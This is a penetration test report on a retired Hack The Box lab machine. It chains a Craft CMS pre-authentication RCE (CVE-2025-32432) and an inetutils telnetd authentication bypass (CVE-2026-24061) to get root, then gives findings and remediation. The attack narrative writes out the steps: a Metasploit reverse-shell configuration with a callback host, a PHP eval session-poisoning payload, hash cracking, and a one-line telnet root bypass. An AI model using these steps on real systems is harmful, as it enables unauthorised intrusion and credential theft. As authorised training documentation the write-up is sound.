# Penetration Test Report: Orion

## Document Control

| Field | Detail |
|-------|--------|
| Report title | Penetration Test Report: Orion |
| Template version | v4 |
| Report version | 1.0 |
| Author | David Lumsden (M3ridi4n) |
| Reviewer (QA) | Self-reviewed |
| Date | 2026-08-30 |
| Classification | Confidential / Training Documentation |
| Distribution | Public portfolio (retired HTB machine) |
| Redaction policy | Flags withheld. HTB IPs obfuscated as 10.129.XX.XX. Sensitive secrets redacted in body. |

### Version history

| Report version | Date | Author | Notes |
|----------------|------|--------|-------|
| 0.1 | 2026-08-30 | D. Lumsden | Initial draft |
| 1.0 | 2026-08-30 | D. Lumsden | Final, built to v4 template |

---

## Table of Contents

1. Executive Summary
2. Scope and Rules of Engagement
3. Methodology and Risk Rating Model
4. Attack Narrative
5. Findings Summary
6. Detailed Findings
7. Strategic Recommendations (Root-Cause Themes)
8. Remediation Roadmap
9. Proof of Exploitation
10. Retest and Validation
- Appendix A: Tools Used
- Appendix B: References

---

## 1. Executive Summary

Orion Telecom was assessed from an external position with no credentials and no prior knowledge of the environment. Full administrative control of the underlying server, along with access to the entire application database, was achieved within a single testing session. The compromise chained two publicly known critical vulnerabilities, both with patches available at the time of testing, together with configuration weaknesses that made secret recovery and lateral movement trivial once initial access was obtained.

The organisation's public-facing platform was running an out-of-date content management system in developer mode, exposing framework internals and application secrets. Once inside, a legacy administrative service (telnet) was left running on the host with a known authentication-bypass flaw, providing a direct path from a low-privileged foothold to full root access.

Overall risk rating: **CRITICAL**

### Findings at a glance

| Severity | Count |
|----------|-------|
| Critical | 2 |
| High | 3 |
| Medium | 1 |
| Informational | 1 |

Most urgent action: patch Craft CMS to 5.6.17 or later and remove the telnet daemon from the host.

---

## 2. Scope and Rules of Engagement

| Item | Detail |
|------|--------|
| In scope | 10.129.XX.XX (single host, orion.htb) |
| Out of scope | Any host outside the assigned HTB instance |
| Authorisation | Hack The Box lab environment; retired machine released for public testing |
| Testing type | Black-box |
| Testing window | 2026-08-30 |
| Constraints | Single session; no denial-of-service; instance IP rotated during testing (target re-provisioned) |

---

## 3. Methodology and Risk Rating Model

Testing was aligned to PTES and structured across the following phases: reconnaissance, enumeration, vulnerability identification, exploitation, post-exploitation, and reporting.

Risk rating model: each finding is assigned a base severity using CVSS v3.1 (vector string shown per finding). Severity labels follow CVSS bands strictly: Critical 9.0 to 10.0, High 7.0 to 8.9, Medium 4.0 to 6.9, Low 0.1 to 3.9. A contextual Risk rating is then derived from Likelihood multiplied by Business Impact, reflecting how the finding would affect the assessed organisation rather than a generic environment.

---

## 4. Attack Narrative

### Phase 1: Reconnaissance

An initial full-port service scan against 10.129.XX.XX returned two open TCP services.

```bash
nmap -sVC -p- 10.129.XX.XX
```

Results:

- 22/tcp: OpenSSH 8.9p1 (Ubuntu 3ubuntu0.15)
- 80/tcp: nginx 1.18.0 (Ubuntu), issuing a redirect to `http://orion.htb/`

The virtual host `orion.htb` was added to `/etc/hosts` mapped to the target IP. The site presented as "Orion Telecom", a fictional telecoms provider marketing itself to government and enterprise clients. No third service, telnet, was visible externally at this stage: relevant later.

### Phase 2: Enumeration

Directory brute-force was run against the web root:

```bash
gobuster dir -u http://orion.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,html,txt -t 50
```

Notable results:

- `/admin` returning 302 to `/admin/login`
- `/assets/` (301)
- Requests to `wp-admin` returning HTTP 418, which is Craft CMS's non-standard "not found" response; this immediately excluded WordPress and confirmed the framework family
- Numerous same-length hits (identical 12272-byte body) matching Craft's catch-all routing, treated as noise

The Craft admin login page (`/admin/login`) disclosed the exact framework version in its page footer: **Craft CMS 5.6.16**. Publishing framework version numbers on unauthenticated pages is a developer oversight; it hands an attacker a direct path to CVE lookup.

Two candidate CVEs surfaced:

- CVE-2025-46731 (Twig SSTI): requires authenticated admin access, so not a foothold candidate.
- CVE-2025-32432: pre-authentication remote code execution via `assets/generate-transform`, CVSS 10.0 Critical. Version 5.6.16 sat inside the vulnerable range; the fix landed in 5.6.17.

### Phase 3: Initial Access

The public proof-of-concept `exploitdb 52525.py` was attempted first and failed at Step 0: the script assumed a `PHPSESSID` cookie and a session path of `/tmp/sess_*`, whereas Craft uses `CraftSessionId` and stores sessions in `/var/lib/php/sessions/`. A useful reminder that public PoCs make environment assumptions and often need modification, not blind execution.

The Metasploit module `exploit/linux/http/craftcms_preauth_rce_cve_2025_32432` was substituted. It automates the full chain:

- Acquire CSRF token (`CraftSessionId` + `CRAFT_CSRF_TOKEN` + `X-CSRF-Token` header)
- Disclose `session.save_path` via a phpinfo leak, confirming `/var/lib/php/sessions`
- Poison the session file and trigger the Yii2 gadget chain

Configuration used:

```
RHOSTS orion.htb
LHOST 10.10.17.39 (tun0)
LPORT 4444
TARGET Unix/Linux Command Shell
```

The exploit landed a Meterpreter session as `www-data`. The shell was dropped to an interactive channel and stabilised with `script /dev/null -c /bin/bash`.

Mechanical breakdown of the chain:

- `POST /index.php?p=admin/actions/assets/generate-transform` with a crafted JSON body
- Yii2's object-config system parses the JSON and instantiates arbitrary classes via the `class` key
- `yii\rbac\PhpManager` is primed as a gadget that will `include()` an attacker-controlled file path
- A follow-up `GET /index.php?p=admin/dashboard&a=<?php eval($_GET['cmd']); ?>` writes the payload into `/var/lib/php/sessions/sess_<CraftSessionId>`
- Triggering the gadget causes `PhpManager` to `include()` the poisoned session file, executing arbitrary commands as `www-data`

### Phase 4: Post-Exploitation and Lateral Movement

Enumeration of the Craft install root at `/var/www/html/craft/` combined with the earlier phpinfo leak exposed the full `$_SERVER` environment, disclosing:

- `CRAFT_ENVIRONMENT=dev`: a production instance running a development configuration
- `CRAFT_DEV_MODE=true`: debug mode enabled, producing verbose errors and environment disclosure
- `CRAFT_ALLOW_ADMIN_CHANGES=true`: the toggle that would have made CVE-2025-46731 (SSTI) reachable once admin credentials were obtained
- `CRAFT_APP_ID`, `CRAFT_SECURITY_KEY`, and `CRAFT_DB_*` credentials in cleartext

The recovered database credentials (`root` / `<REDACTED>`) authenticated against local MariaDB 10.6.23:

```bash
mysql -u root -p orion
```

Schema enumeration on the `orion` database (66 tables) identified a `users` table with 28 columns. The admin record was extracted:

```
id: 1
username: admin
email: adam@orion.htb
password: <REDACTED> 
```

The hash was cracked offline on the Kali host:

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

Recovered plaintext: `<REDACTED>`.

Password reuse was tested against SSH and succeeded:

```bash
ssh adam@orion.htb
```

The `user.txt` flag was retrieved from `adam`'s home directory.

### Phase 5: Full Compromise

Local service enumeration as `adam`:

```bash
ss -tlnp
```

Exposed listeners:

- `127.0.0.1:53`: systemd-resolved
- `0.0.0.0:80`, `0.0.0.0:22`: nginx and SSH (externally reachable)
- `127.0.0.1:3306`: MariaDB (correctly bound to loopback)
- `127.0.0.1:23`: telnetd (loopback only, which is why the external nmap did not see it)

Version check:

```bash
telnet --version
# GNU inetutils 2.7
```

This version matched CVE-2026-24061 (CVSS 9.8 Critical): a remote authentication bypass in inetutils `telnetd` via `-f root` injected through the `USER` environment variable (CWE-88: Argument Injection). The root cause is that `telnetd` forwards the client-supplied `USER` variable into `login(1)` without sanitisation; `login` then interprets `-f root` as its own command-line flags and skips the authentication step entirely.

Exploitation:

```bash
USER="-f root" telnet -a 127.0.0.1
```

Result: a root shell without a password. The `root.txt` flag was retrieved.

---

## 5. Findings Summary

| ID | Finding | Severity | CVSS | Risk | CVE |
|----|---------|----------|------|------|-----|
| F-01 | Craft CMS pre-authentication remote code execution | Critical | 10.0 | Critical | CVE-2025-32432 |
| F-02 | inetutils telnetd authentication bypass via argument injection | Critical | 9.8 | Critical | CVE-2026-24061 |
| F-03 | Development mode enabled on production instance (secret disclosure) | High | 7.5 | High | n/a |
| F-04 | Application secrets and database credentials stored in cleartext | High | 7.5 | High | n/a |
| F-05 | Credential reuse across application admin and OS account | High | 8.1 | High | n/a |
| F-06 | Application database account granted MariaDB root privileges | Medium | 5.5 | Medium | n/a |
| F-07 | Framework version disclosure on unauthenticated pages | Informational | 3.7 | Low | n/a |

---

## 6. Detailed Findings

### F-01: Craft CMS pre-authentication remote code execution

| Field | Detail |
|-------|--------|
| Severity | Critical |
| CVSS v3.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` = 10.0 |
| Likelihood | High |
| Business impact | High |
| Risk | Critical |
| CVE | CVE-2025-32432 |
| Affected asset | orion.htb (10.129.XX.XX), Craft CMS 5.6.16 |
| Authentication required | None |
| MITRE ATT&CK | T1190 (Exploit Public-Facing Application) |

Description: Craft CMS versions prior to 5.6.17 accept unauthenticated requests to `/index.php?p=admin/actions/assets/generate-transform` and pass user-controlled JSON into the underlying Yii2 object-configuration system. This permits arbitrary class instantiation, which can be chained into `include()` of an attacker-controlled path (session-file poisoning), giving remote code execution as the web-server user.

Evidence: See Section 4, Phase 3. Metasploit module `craftcms_preauth_rce_cve_2025_32432` returned a Meterpreter session as `www-data` on first attempt against the target.

Business impact: Any anonymous attacker with network reach to the site obtains code execution on the application server. That is the entry point for data theft, ransomware staging, and further lateral movement. In a production context this represents a total loss of confidentiality and integrity for the platform.

Remediation:

- Upgrade Craft CMS to 5.6.17 or later immediately.
- Review web server, application, and database logs for indicators of prior exploitation across the full window the vulnerable version was deployed.
- Rotate all secrets that were readable by the web-server user, including `CRAFT_SECURITY_KEY` and database credentials.

References:

- https://nvd.nist.gov/vuln/detail/CVE-2025-32432
- https://github.com/craftcms/cms/security/advisories

---

### F-02: inetutils telnetd authentication bypass via argument injection

| Field | Detail |
|-------|--------|
| Severity | Critical |
| CVSS v3.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` = 9.8 |
| Likelihood | High (once a local foothold exists) |
| Business impact | High |
| Risk | Critical |
| CVE | CVE-2026-24061 |
| Affected asset | orion.htb (10.129.XX.XX), GNU inetutils 2.7 telnetd on 127.0.0.1:23 |
| Authentication required | None |
| MITRE ATT&CK | T1068 (Exploitation for Privilege Escalation), T1078 (Valid Accounts, via bypass) |

Description: GNU inetutils `telnetd` forwards the client-supplied `USER` environment variable directly into `login(1)` without sanitisation. Because `login` accepts a `-f` flag to skip authentication when the calling process is trusted, setting `USER="-f root"` causes the string to be parsed as command-line arguments (CWE-88, argument injection). The result is a root shell with no password prompt.

Evidence: See Section 4, Phase 5. `USER="-f root" telnet -a 127.0.0.1` returned an interactive shell as `root`.

Business impact: Any user with an interactive session on the host, however obtained, can escalate to full root privilege with a single command. In combination with F-01 this collapses the entire kill chain into an anonymous-internet-to-root path.

Remediation:

- Remove the telnet daemon from the host. There is no legitimate operational reason to run telnet in 2026.
- If telnet must be retained temporarily, patch inetutils to a version above 2.7 that carries the fix, and confirm the fix is applied by reviewing package changelogs.
- Baseline the host build to prohibit installation of cleartext administrative protocols going forward.

References:

- https://nvd.nist.gov/vuln/detail/CVE-2026-24061
- https://cwe.mitre.org/data/definitions/88.html

---

### F-03: Development mode enabled on production instance

| Field | Detail |
|-------|--------|
| Severity | High |
| CVSS v3.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` = 7.5 |
| Likelihood | High |
| Business impact | High |
| Risk | High |
| CVE | n/a |
| Affected asset | Craft CMS instance on orion.htb |
| Authentication required | None |
| MITRE ATT&CK | T1592 (Gather Victim Host Information), T1082 (System Information Discovery) |

Description: The Craft application was configured with `CRAFT_ENVIRONMENT=dev` and `CRAFT_DEV_MODE=true` on what was, functionally, a production deployment. This turned verbose error reporting on and, in combination with F-01, allowed a phpinfo-style disclosure that exposed the full `$_SERVER` block, including application secrets and database credentials. `CRAFT_ALLOW_ADMIN_CHANGES=true` was also set, which would have unlocked CVE-2025-46731 (SSTI) had admin credentials been obtained.

Evidence: Environment variables recovered directly from the phpinfo leak during Phase 4. See Section 4.

Business impact: Debug mode converts every application error into an intelligence gift. Attackers get file paths, framework internals, and often credentials without additional effort. It also weakens the impact ceiling of otherwise minor bugs.

Remediation:

- Set `CRAFT_DEV_MODE=false` and `CRAFT_ENVIRONMENT=production` on all internet-facing instances.
- Set `CRAFT_ALLOW_ADMIN_CHANGES=false` in production; admin configuration changes should be promoted through a deployment pipeline, not made live.
- Introduce a deployment check that fails the build if debug flags are true in a production environment.

---

### F-04: Application secrets and database credentials stored in cleartext

| Field | Detail |
|-------|--------|
| Severity | High |
| CVSS v3.1 | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N` = 7.5 |
| Likelihood | High |
| Business impact | High |
| Risk | High |
| CVE | n/a |
| Affected asset | `/var/www/html/craft/.env` and process environment on orion.htb |
| Authentication required | Local (any account with read access to environment or `.env`) |
| MITRE ATT&CK | T1552.001 (Unsecured Credentials: Credentials In Files) |

Description: The Craft `.env` file held the MariaDB root password, `CRAFT_SECURITY_KEY`, and `CRAFT_APP_ID` in plaintext, and the values were also readable from the process environment. Any process, or attacker, able to read the environment of the web-server user obtained the full credential set.

Evidence: Credentials `root` / `<REDACTED>` recovered from environment disclosure during Phase 4 and successfully used to authenticate to MariaDB.

Business impact: Credential theft is the pivot from a single-service compromise to a whole-environment compromise. Storing them where the compromised process can read them means the blast radius of any web-tier bug is automatically the entire data tier.

Remediation:

- Migrate secrets to a dedicated secrets manager (HashiCorp Vault, AWS Secrets Manager, or equivalent). The application should fetch secrets at runtime using a scoped identity.
- Restrict `.env` permissions to `600` and to a dedicated non-web owner where the file must remain on disk.
- Rotate all disclosed secrets and enforce rotation on a defined cadence.

---

### F-05: Credential reuse across application admin and OS account

| Field | Detail |
|-------|--------|
| Severity | High |
| CVSS v3.1 | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:H` = 8.1 |
| Likelihood | High |
| Business impact | High |
| Risk | High |
| CVE | n/a |
| Affected asset | Craft admin (`admin`) and OS account (`adam`) on orion.htb |
| Authentication required | Credential material (obtained via F-04 and offline cracking) |
| MITRE ATT&CK | T1021.004 (Remote Services: SSH), T1110.002 (Password Cracking) |

Description: The bcrypt password hash for the Craft admin (`admin`, email `adam@orion.htb`) cracked to `<REDACTED>` against `rockyou.txt`. The same password authenticated the OS account `adam` via SSH, converting an application-tier credential into a shell on the host.

Evidence: Bcrypt hash extracted from the `users` table during Phase 4; cracked with `hashcat -m 3200`; SSH authentication as `adam` succeeded with the recovered plaintext.

Business impact: Password reuse turns any single credential leak into a full identity compromise. In a corporate environment this pattern is what takes a breached SaaS account and turns it into VPN access, then domain access.

Remediation:

- Enforce unique credentials for application and OS accounts, ideally via SSO with distinct authenticators per tier.
- Mandate a password manager for privileged users and prohibit reuse in policy.
- Require multi-factor authentication on SSH for accounts with interactive access.
- Increase minimum password entropy and screen against known-compromised password lists.

---

### F-06: Application database account granted MariaDB root privileges

| Field | Detail |
|-------|--------|
| Severity | Medium |
| CVSS v3.1 | `CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:L` = 5.5 |
| Likelihood | Medium |
| Business impact | Medium |
| Risk | Medium |
| CVE | n/a |
| Affected asset | MariaDB 10.6.23 on orion.htb |
| Authentication required | Local (via disclosed credentials) |
| MITRE ATT&CK | T1078 (Valid Accounts) |

Description: The Craft application connected to MariaDB using the `root` database account. Once its password was recovered (see F-04) the attacker inherited full database administrator privileges, well beyond what the application actually required.

Evidence: Successful authentication as MariaDB `root` and full schema enumeration during Phase 4.

Business impact: Least-privilege violations magnify the impact of any credential leak. A scoped application user would have limited the attacker to the `orion` database and blocked administrative operations.

Remediation:

- Create a dedicated database user for the Craft application with rights limited to `SELECT`, `INSERT`, `UPDATE`, `DELETE` on the `orion` schema (adjusted to actual application need).
- Retire the use of the `root` account for application connectivity.
- Retain the existing correct configuration of MariaDB bound to `127.0.0.1` only.

---

### F-07: Framework version disclosure on unauthenticated pages

| Field | Detail |
|-------|--------|
| Severity | Informational |
| CVSS v3.1 | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` = 3.7 |
| Likelihood | High |
| Business impact | Low |
| Risk | Low |
| CVE | n/a |
| Affected asset | `/admin/login` on orion.htb |
| Authentication required | None |
| MITRE ATT&CK | T1592.004 (Client Configurations) |

Description: The unauthenticated Craft admin login page rendered the exact framework version (`Craft CMS 5.6.16`) in the page footer. Exact version disclosure lets any attacker map the deployment to a CVE list in seconds.

Evidence: Footer text visible on the login page during Phase 2.

Business impact: Alone this is low impact. In combination with an unpatched product (F-01) it accelerates targeted exploitation from hours of fingerprinting to minutes.

Remediation:

- Suppress framework and version strings on public-facing pages and error responses.
- Include header and body content-hardening checks in the deployment pipeline.

---

## 7. Strategic Recommendations (Root-Cause Themes)

**Theme 1: Patch discipline is absent.** Two publicly known critical CVEs (CVE-2025-32432 and CVE-2026-24061) were live on the host, both with patches available. Recommendation: establish a documented vulnerability management process with SLA-bound remediation windows (Critical within 72 hours, High within 14 days) and evidence of automated patch scanning against the internet-facing estate.

**Theme 2: Production hardening is treated as optional.** Development flags were enabled on a live instance, secrets were stored in cleartext where the runtime process could read them, and an obsolete cleartext administrative protocol was left running. Recommendation: define a written production build baseline (CIS or equivalent) and gate deployment on automated conformance checks.

**Theme 3: Credential hygiene is not enforced.** A single reused password bridged the application and operating-system trust boundaries; the application connected to the database as `root`. Recommendation: implement a credential policy covering uniqueness, secrets storage, and least privilege for service accounts, with technical enforcement rather than policy alone.

**Theme 4: Information disclosure is systemic.** Framework version, environment variables, and debug output all leaked information that accelerated compromise. Recommendation: bake response-hardening (no framework fingerprints, no debug output, no environment leaks) into a shared platform template so every new deployment inherits it.

---

## 8. Remediation Roadmap

### Immediate (Critical priority)

- Patch Craft CMS to 5.6.17 or later (F-01).
- Remove `telnetd` from the host; if retention is required, patch inetutils past 2.7 (F-02).
- Disable dev mode and set the environment to production on the Craft instance (F-03).
- Rotate all secrets disclosed during testing: `CRAFT_SECURITY_KEY`, database root password, Craft admin password (F-04, F-05).

### Short-term (High priority)

- Migrate secrets out of `.env` into a dedicated secrets manager (F-04).
- Enforce unique credentials across application and OS boundaries; introduce MFA on SSH (F-05).
- Replace the MariaDB root connection with a scoped application user (F-06).

### Medium-term

- Suppress framework version disclosure across all public pages (F-07).
- Establish a documented vulnerability management process with SLA-bound remediation windows.
- Introduce a production build baseline (hardening template) and automated conformance checks in the deployment pipeline.

---

## 9. Proof of Exploitation

| Flag | Method | Location |
|------|--------|----------|
| User | Foothold via CVE-2025-32432, database credential recovery, bcrypt crack, SSH with reused password | `/home/adam/user.txt` -> [REDACTED] |
| Root | Local privilege escalation via CVE-2026-24061 (telnetd argument injection) | `/root/root.txt` -> [REDACTED] |

---

## 10. Retest and Validation

A retest is recommended once the immediate-priority items have been actioned, targeting a window no later than 30 days after remediation. Retest scope should verify:

- Craft CMS is on 5.6.17 or later, and the `generate-transform` action no longer accepts unauthenticated exploitation.
- Telnet is no longer installed or listening on the host.
- `CRAFT_DEV_MODE`, `CRAFT_ENVIRONMENT`, and `CRAFT_ALLOW_ADMIN_CHANGES` reflect production values.
- All disclosed secrets have been rotated; no residual credential works.
- The Craft application no longer authenticates to MariaDB as `root`.

---

## Appendix A: Tools Used

| Tool | Version | Purpose |
|------|---------|---------|
| nmap | 7.94 | Service and port discovery |
| gobuster | 3.6 | Directory brute force |
| Metasploit Framework | latest at testing | Automated exploitation of CVE-2025-32432 |
| curl | 7.88 | Manual HTTP request verification |
| mysql client | 10.6 | Database enumeration |
| hashcat | 7.1.2 | Offline bcrypt cracking |
| OpenSSH client | 9.x | Lateral movement to `adam` |
| telnet (inetutils client) | 2.7 | Privilege escalation trigger |

## Appendix B: References

| Reference | URL |
|-----------|-----|
| CVE-2025-32432 (Craft CMS pre-auth RCE) | https://nvd.nist.gov/vuln/detail/CVE-2025-32432 |
| Craft CMS security advisories | https://github.com/craftcms/cms/security/advisories |
| CVE-2026-24061 (inetutils telnetd argument injection) | https://nvd.nist.gov/vuln/detail/CVE-2026-24061 |
| CWE-88: Argument Injection or Modification | https://cwe.mitre.org/data/definitions/88.html |
| MITRE ATT&CK T1190 | https://attack.mitre.org/techniques/T1190/ |
| MITRE ATT&CK T1068 | https://attack.mitre.org/techniques/T1068/ |
| MITRE ATT&CK T1552.001 | https://attack.mitre.org/techniques/T1552/001/ |

---

*Produced for educational purposes within an authorised training environment. All testing was conducted legally on assigned infrastructure.*
